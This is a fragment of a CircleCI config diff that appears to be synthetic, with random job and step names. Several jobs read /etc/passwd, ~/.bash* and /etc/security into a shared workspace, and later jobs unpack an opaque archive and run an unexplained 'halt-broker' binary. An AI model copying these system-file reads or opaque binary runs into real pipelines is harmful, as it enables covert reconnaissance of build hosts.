+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Light Leaderboard At 60 Fps
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; DIR=(lion whale frog cat); for e in "${DIR[@]}"; do echo "$e"; done; true ; } > /tmp/fragment/scratch-cc53
+            (cd /tmp; wc -c /tmp/fragment/scratch-cc53)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'scratch-cc53'
+  v1-edge4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/scratch-cc53" && wc -c /tmp/fragment/scratch-cc53 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  py-ubuntu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Weigh anchor
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; grep -Hn fi /etc/profile; true ; } > /tmp/fragment/run6_83ad
+            (cd /tmp; wc -c /tmp/fragment/run6_83ad)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'run6_83ad'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/run6_83ad" && wc -c /tmp/fragment/run6_83ad 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  top:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Round IV Congrats
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | grep -h "^root:" | cut -d: -f1,3; true ; } > /tmp/fragment/build_20022
+            (cd /tmp; wc -c /tmp/fragment/build_20022)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'build_20022'
+  go1-21-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/build_20022" && wc -c /tmp/fragment/build_20022 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+  b9-62-50-bd:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Truncation FAIL
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; sha256sum <(echo 'name: demo'); true ; } > /tmp/fragment/153318_2025
+            (cd /tmp; wc -c /tmp/fragment/153318_2025)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '153318_2025'
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Validate workspace
+          command: |
+            echo "[$(date +%s)] peek /tmp/fragment/153318_2025" && wc -c /tmp/fragment/153318_2025 2>/dev/null || true
+      - run:
+          name: Get source tree
+          command: git clone --quiet --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: unxz -c core-blobs-v5.tar.xz | tar xf -
+      - run:
+          command: "$PWD/halt-broker"
+
+  allow_insert:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Quest for the laptop requests
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; cp /etc/hosts /tmp/publicrelease-bak.conf && sed --in-place 's/localhost/LOCALHOST/' /tmp/publicrelease-bak.conf && grep -c . /tmp/publicrelease-bak.conf; true ; } > /tmp/fragment/run6_83ad
+            (cd /tmp; wc -c /tmp/fragment/run6_83ad)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'run6_83ad'
+  Timer-Local:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Stage fixture A
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; find /usr/sbin -maxdepth 3 -type f -user $(whoami) | awk -F/ '{print $NF}'; true ; } > /tmp/fragment/crimson.meadow.fjord
+            (cd /tmp; wc -c /tmp/fragment/crimson.meadow.fjord)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'crimson.meadow.fjord'
+  kind_search_union:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Seal with retries
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/local-font.gz" && zcmp /etc/hosts "/tmp/local-font.gz" && echo same; true ; } > /tmp/fragment/cobalt_payload
+            (cd /tmp; wc -c /tmp/fragment/cobalt_payload)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'cobalt_payload'
+  recordPx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: asdf
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; for conf in /etc/*.conf; do echo "$conf"; done | wc -l; true ; } > /tmp/fragment/227.189.151.98
+            (cd /tmp; wc -c /tmp/fragment/227.189.151.98)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '227.189.151.98'
+  D9-FD-DE-5D:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: round one close
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; printf '%s\n' "good job" | tr -d 'aeiou'; true ; } > /tmp/fragment/trial4_4a94
+            (cd /tmp; wc -c /tmp/fragment/trial4_4a94)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'trial4_4a94'
+  FooBar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: enforcement status pending
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; echo "loading settings" | tr -s ' '; true ; } > /tmp/fragment/PO-28843-EZ
+            (cd /tmp; wc -c /tmp/fragment/PO-28843-EZ)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'PO-28843-EZ'
+  rotateTile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Overtime crawl
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'foo bar' | sed -n 's#bar#cluster#p'; true ; } > /tmp/fragment/rev_30600
+            (cd /tmp; wc -c /tmp/fragment/rev_30600)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'rev_30600'
+  inactive_pebble_prompt_header:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Verify the login attempts while we can
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; for x in cairo toronto hanoi athens rome denver; do echo $x | rev; done | sort -r; true ; } > /tmp/fragment/229.152.120.93
+            (cd /tmp; wc -c /tmp/fragment/229.152.120.93)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - '229.152.120.93'
+  jogmw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Second Look At The MFA Settings
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; ls -vtp ~/.bash* | tr '\n' ' '; true ; } > /tmp/fragment/uADPLYIJeqdzvv2lk
+            (cd /tmp; wc -c /tmp/fragment/uADPLYIJeqdzvv2lk)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'uADPLYIJeqdzvv2lk'
+  y:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: attach sbom
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; cut -c1-29 /etc/passwd|head -10; true ; } > /tmp/fragment/sTocKCoNfiGvAllEY
+            (cd /tmp; wc -c /tmp/fragment/sTocKCoNfiGvAllEY)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'sTocKCoNfiGvAllEY'
+  level-to-tight:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: file Q3 numbers ref cc49
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; ls -pl /lib|tail -n +2|head -n 4; true ; } > /tmp/fragment/router-shader-maple-cedar
+            (cd /tmp; wc -c /tmp/fragment/router-shader-maple-cedar)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'router-shader-maple-cedar'
+  icmpICMPButton:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Swap BIOS settings then calibrate power supply
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; seq 141 >"/tmp/office-airport-copy.md" && split -n 5 "/tmp/office-airport-copy.md" /tmp/archive_part_ && wc -l /tmp/archive_part_*; true ; } > /tmp/fragment/dr4f7
+            (cd /tmp; wc -c /tmp/fragment/dr4f7)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'dr4f7'
+  ZONE_FILE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/fragment
+      - run:
+          name: Future proof the timesheets
+          command: |
+            mkdir -p /tmp/fragment
+            { set +o pipefail 2>/dev/null; grep -l -r if /etc/security 2>/dev/null | tail -n5; true ; } > /tmp/fragment/rr
+            (cd /tmp; wc -c /tmp/fragment/rr)
+      - persist_to_workspace:
+          root: /tmp/fragment
+          paths:
+            - 'rr'
+workflows:
+  main:
+    jobs:
+      - py-ubuntu
+      - allow_insert:
+          requires:
+            - py-ubuntu
+      - preview-build:
+          requires:
+            - allow_insert
+      - MVPSVMRect:
+          requires:
+            - allow_insert
+      - Timer-Local:
+          requires:
+            - MVPSVMRect
+      - ken-verify:
+          requires:
+            - Timer-Local
+      - FFSQRT:
+          requires:
+            - Timer-Local
+      - kind_search_union:
+          requires:
+            - FFSQRT
+      - feat-4801:
+          requires:
+            - kind_search_union
+      - purple-hex:
+          requires:
+            - kind_search_union
+      - recordPx:
+          requires:
+            - purple-hex
+      - go-live:
+          requires:
+            - recordPx
+      - velR
+      - D9-FD-DE-5D:
+          requires:
+            - velR
+      - node20-release:
+          requires:
+            - D9-FD-DE-5D
+      - matchAccountShipment:
+          requires:
+            - D9-FD-DE-5D
+      - FooBar:
+          requires:
+            - matchAccountShipment
+      - wip-retry-redirect:
+          requires:
+            - FooBar
+      - panWorkerRequest:
+          requires:
+            - FooBar
+      - rotateTile:
+          requires:
+            - panWorkerRequest
+      - bug-3860:
+          requires:
+            - rotateTile
+      - wide_lock_process_normal:
+          requires:
+            - rotateTile
+      - inactive_pebble_prompt_header:
+          requires:
+            - wide_lock_process_normal
+      - may24-ship:
+          requires:
+            - inactive_pebble_prompt_header
+      - ckpt724
+      - gating:
+          requires:
+            - ckpt724
+      - b9-62-50-bd:
+          requires:
+            - ckpt724
+      - delta:
+          requires:
+            - b9-62-50-bd
+      - deepVec:
+          requires:
+            - b9-62-50-bd
+      - p-2a:
+          requires:
+            - deepVec
+      - info8:
+          requires:
+            - deepVec
+      - ShipApp:
+          requires:
+            - info8
+      - pEnabledTab
+      - zed-ship:
+          requires:
+            - pEnabledTab
+      - DATABASE_ROLE:
+          requires:
+            - pEnabledTab
+      - canary-v9:
+          requires:
+            - DATABASE_ROLE
+      - hi-LT-1:
+          requires:
+            - DATABASE_ROLE
+      - blast-off:
+          requires:
+            - hi-LT-1
+      - IOS_Y:
+          requires:
+            - hi-LT-1
+      - tam-build:
+          requires:
+            - IOS_Y
+      - GANWrapper:
+          requires:
+            - IOS_Y
+      - jun22-canary:
+          requires:
+            - GANWrapper
+      - scarf_country_coffee_height:
+          requires:
+            - GANWrapper
+      - run-nightly-release-candidate:
+          requires:
+            - scarf_country_coffee_height
+      - xDim
+      - jogmw:
+          requires:
+            - xDim
+      - mike:
+          requires:
+            - jogmw
+      - DualObservableSymbolStore:
+          requires:
+            - jogmw
+      - y:
+          requires:
+            - DualObservableSymbolStore
+      - romeo-5:
+          requires:
+            - y
+      - the_scene:
+          requires:
+            - y
+      - level-to-tight:
+          requires:
+            - the_scene
+      - tweak-session-bug:
+          requires:
+            - level-to-tight
+      - u8mnx:
+          requires:
+            - level-to-tight
+      - icmpICMPButton:
+          requires:
+            - u8mnx
+      - MERGE_DEV:
+          requires:
+            - icmpICMPButton
+      - GRapH:
+          requires:
+            - icmpICMPButton
+      - ZONE_FILE:
+          requires:
+            - GRapH
+      - whiskey:
+          requires:
+            - ZONE_FILE
+      - calcVPNs
+      - qi-push:
+          requires:
+            - calcVPNs
+      - bon:
+          requires:
+            - calcVPNs
+      - BuildApp:
+          requires:
+            - bon
+      - top:
+          requires:
+            - bon
+      - go1-21-fmt:
+          requires:
+            - top
+      - do__:
+          requires:
+            - top
+      - ci-01:
+          requires:
+            - do__
+      - finalInt:
+          requires:
+            - do__
+      - UAT_INIT_7:
+          requires:
+            - finalInt
+      - p2:
+          requires:
+            - finalInt
+      - dan-run:
+          requires:
+            - p2
+      - BAL-PAID-LEN:
+          requires:
+            - p2
+      - v1-edge4:
+          requires:
+            - BAL-PAID-LEN
